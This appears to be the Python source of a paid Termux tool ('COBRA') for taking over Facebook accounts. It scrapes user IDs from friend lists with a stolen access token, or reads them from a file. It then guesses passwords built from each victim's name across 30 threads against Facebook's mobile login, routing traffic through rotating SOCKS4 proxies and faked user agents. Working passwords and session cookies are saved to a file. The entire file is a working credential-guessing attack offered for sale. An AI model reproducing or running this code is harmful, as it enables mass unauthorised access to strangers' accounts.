import os 
#os.system("pkg install sox -y")
#os.system("play op.mp3")
#os.system("pkg install espeak")
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
import requests,zlib,platform
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3363 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mCOBRA')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'



def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
		ua=open('bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('bbnew.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]

def back():
	login()
FIROZ="FIROZ"
imt="SINTHI"
ak="CLASS3-"

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])


pwpluss,pwnya=[],[]
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def COBRAj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
	
	import getpass

attemps = 0

import os
os.system('clear')
attempts = 0
max_attempts = 12345677901  # Set your desired maximum number of attempts

while attempts < max_attempts:
    print(f"""
\033[0;96m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\033[0;96m║   \033[1;93m██████╗\033[1;97m ██████╗\033[1;92m ██████╗\033[1;94m ██████╗  \033[1;91m█████╗   \033[0;96m║
\033[0;96m║  \033[1;93m██╔════╝\033[1;97m██╔═══██╗\033[1;92m██╔══██╗\033[1;94m██╔══██╗\033[1;91m██╔══██╗  \033[0;96m║
\033[0;96m║  \033[1;93m██║    \033[1;97m ██║   ██║\033[1;92m██████╔╝\033[1;94m██████╔╝\033[1;91m███████║  \033[0;96m║
\033[0;96m║  \033[1;93m██║     \033[1;97m██║   ██║\033[1;92m██╔══██╗\033[1;94m██╔══██╗\033[1;91m██╔══██║  \033[0;96m║
\033[0;96m║  \033[1;93m╚██████╗\033[1;97m╚██████╔╝\033[1;92m██████╔╝\033[1;94m██║  ██║\033[1;91m██║  ██║  \033[0;96m║
\033[0;96m║   \033[1;93m╚═════╝ \033[1;97m╚═════╝ \033[1;92m╚═════╝ \033[1;94m╚═╝  ╚═╝\033[1;91m╚═╝  ╚═╝  \033[0;96m║
\033[0;96m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[1;97m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[1;95m        [ WORKS ON ONLY MOBILE DATA ]        \033[1;97m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[0;36m 
╠══•>Author                  : FIROZ AHMED \033[0;36m   ║\033[1;33m 
╠══•>Facebook                : Firoz Ahmed   \033[1;33m ║  \033[1;92m  
╠══•>Github                  : Firoz-Boss   \033[1;92m  ║\033[1;95m   
╠══•>Whatsapp                : 01871528249  \033[1;95m  ║\033[1;96m 
╠══•>TOOLS                   : Paid         \033[1;96m  ║ \033[1;31m   
╠══•>VERSION                 : 0.1           \033[1;31m ║\033[1;36m 
\033[1;97m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
    os.system('espeak -a 300 " tools, username, "')
    username = input(' \033[0;92mEnter Username: ')
    os.system('espeak -a 300 " tools, password, "')
    password = input(' \033[0;93mEnter Password: ')
    attempts += 1

    # Add an exit condition (e.g., after a certain number of attempts)
    if attempts >= max_attempts:
        print("Maximum attempts reached. Exiting.")
        break


    if username == 'FIROZ' and password == 'MUBIN':
        print(' \033[0;92mLog in successfully.')
        os.system('espeak -a 300 " You have logged in successfully  brother,"')
        break
    else:
        print(' Incorrect Pass Please Check And Try Again ')
        os.system('espeak -a 300 " password, incorrect,"')
        os.system('clear')
        attemps += 1
        continue
        
import os

# Use espeak to speak a message
os.system('espeak -a 300 "Your Real Name"')

# Get the user's name
NameX = input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')

# Use espeak to welcome the user
os.system(f'espeak -a 300 "Welcome, Mr. {NameX}"')

# Open a website (in this case, Facebook)
os.system('xdg-open https://www.facebook.com/firoz.ahmed5678')

def banner():
	os.system("clear")
	print (f"""
\033[0;96m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\033[0;96m║   \033[1;93m██████╗\033[1;97m ██████╗\033[1;92m ██████╗\033[1;94m ██████╗  \033[1;91m█████╗   \033[0;96m║
\033[0;96m║  \033[1;93m██╔════╝\033[1;97m██╔═══██╗\033[1;92m██╔══██╗\033[1;94m██╔══██╗\033[1;91m██╔══██╗  \033[0;96m║
\033[0;96m║  \033[1;93m██║    \033[1;97m ██║   ██║\033[1;92m██████╔╝\033[1;94m██████╔╝\033[1;91m███████║  \033[0;96m║
\033[0;96m║  \033[1;93m██║     \033[1;97m██║   ██║\033[1;92m██╔══██╗\033[1;94m██╔══██╗\033[1;91m██╔══██║  \033[0;96m║
\033[0;96m║  \033[1;93m╚██████╗\033[1;97m╚██████╔╝\033[1;92m██████╔╝\033[1;94m██║  ██║\033[1;91m██║  ██║  \033[0;96m║
\033[0;96m║   \033[1;93m╚═════╝ \033[1;97m╚═════╝ \033[1;92m╚═════╝ \033[1;94m╚═╝  ╚═╝\033[1;91m╚═╝  ╚═╝  \033[0;96m║
\033[0;96m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[1;97m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[1;95m        [ WORKS ON ONLY MOBILE DATA ]        \033[1;97m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[0;36m 
╠══•>Author                  : FIROZ AHMED \033[0;36m   ║\033[1;33m 
╠══•>Facebook                : Firoz Ahmed   \033[1;33m ║  \033[1;92m  
╠══•>Github                  : Firoz-Boss   \033[1;92m  ║\033[1;95m   
╠══•>Whatsapp                : 01871528249  \033[1;95m  ║\033[1;96m 
╠══•>TOOLS                   : Paid         \033[1;96m  ║ \033[1;31m   
╠══•>VERSION                 : 0.1           \033[1;31m ║\033[1;36m 
\033[1;97m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	COBRAj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Create File\n\x1b[1;97m[3] Random Clone\n\x1b[1;95m[4] Contact With Admin\n\033[0;97m[E] \033[0;91mEXIT ')
	COBRAj('\033[0;97m===============================================')
	COBRA= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if COBRA in ['m']:
		public()
	elif COBRA in ['1']:
		crack_file()
	elif COBRA in ['i','0i']:
		result()
	elif COBRA in ['2','02']:
		os.system("python FILE.py")
	elif COBRA in ['3','03']:
		os.system("python sinthi.py")
	elif COBRA in ['4','04']:
		os.system('xdg-open https://wa.me/+8801871528249')
	elif COBRA in ['E']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('#DONE LOGOUT ')
		exit()
	else:
		print('# SELECT CORRECTLY ')
		os.system('espeak -a 300 " Please select correctly brother"')
		back()
def error():
	print(f'{k}#TRY AGAIN {u}')
	time.sleep(4)
	back()
	
def result():
	os.system('clear')
	banner()
	print(' 1. CP ACCOUNT ')
	print(' 2. OK ACCOUNT')
	print(' 0. EXIT	')
	kz = input('\n Choose : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Not Found')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('You Have No CP Results ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n   Choose : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' CHOOSE RIGHT OPTION ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'  {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="yellow")
				nocp +=1
			input('[ Click Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(' No OK FILE HERE ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n CHOOSE : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' SELECT RIGHT OPTION ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f' {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="green")
				nocp +=1
			input('[ CLICK ENTER TO BACK ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('SELECT RIGHT OPTION ')
		exit()

def public():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		banner()
		jum = int(input('\x1b[1;97m [+] ENTER THE NUMBERS OF ID′S : '))
	except ValueError:
		
		back()
	if jum<1 or jum>100000000:
		
		back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' [] INPUT ID '+str(yz)+': ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('#TRY AGAIN ')
			os.system('clear')
	try:
		print(f' [] TOTAL ID: {P}'+str(len(id)))
		print('')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		print(f'IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LINK ')
		time.sleep(3)
		back()
		
def crack_file():
	os.system('clear')
	banner()
	os.system('espeak -a 300 " your file name"')
	print('\033[1;32m[ Put File Example:  /sdcard/BOSS.txt  Etc...]')
	o = input('\x1b[1;97m [+] INPUT FILE NAME : ')
	print('')
	try:lin = open(o).read().splitlines()
	except:
		print('File Not Found')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()
	
def setting():
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGIN \n\x1b[1;97m [1] METHOD(1) \n\x1b[1;97m [2] METHOD(2) ')
	os.system('espeak -a 300 " choose a option as your wish"')
	hc = input(' \033[1;96mCHOOSE: ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mbasic')
	else:
		method.append('mobile')
	passwrd()
	exit()

def passwrd():
	os.system('clear')
	banner()
	print(f"\033[97;1m[\033[92;1m+\033[97;1m]\033[1;93m USER NAME\033[1;96m     :\033[1;97m "+NameX)
	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;93mTOTAL ID′S\033[1;96m    :\033[0;97m '+str(len(id)))
	current_time = time.strftime("%I:%M %p")  # Get current time in AM/PM format
	print(f'\033[97;1m[\033[92;1m+\033[97;1m] \033[1;94mStarting Time \033[1;96m:\033[1;92m {current_time}')
	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[1;96mCloning Speed Ultra Super Fast")
	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[1;96mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
	COBRAj(f'\033[0;97m===============================================')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(nmf)
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@#')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
					
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(nmf)
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@#')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
					
					
					
				pool.submit(crack,idf,pwv)
	print('')
	COBRAj('==========================================')
	COBRAj('CLONING COMPLETE .......... ')
	print(f'{h}[{h}🥰{h}]{h} Your Total OK ids : {h}%s '%(ok))
	input('CLICK ENTER TO EXIT ')
		
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo}[FIROZ-AHMED] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#COBRA-BOSS
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•COBRA-Cp] {idf} • {pw}')     
				os.system('espeak -a 300 " cobra, CP, ID"')
				open('/sdcard/COBRA-CP.txt','a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				#COBRA-BOSS
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•COBRA-Ok😘] {idf} • {pw}\n\033[0;93m[🇧🇩]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 "cobra, Ok, ID"')
				open('/sdcard/COBRA-OK.txt', 'a').write( idf+' | '+pw+'\n'+'coki'+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('touch prox.txt')
	except:pass

def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/.mrFIROZ -cov', 'r').read()
	r1=requests.get("https://raw.githubusercontent.com/Firoz-Boss/Approval/main/approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		os.system("clear")
		banner()
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m FREE USER NOT COME INBOX")
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m COBRA-BOSS, TOOLS Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+FIROZ+key1)
		name = input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Name : ")
		input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
		time.sleep(1.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+FIROZ+''+key1
		os.system('am start https://wa.me/+8801871528249?text=' + tks)
		Subscraption() 
Subscraption() 
login()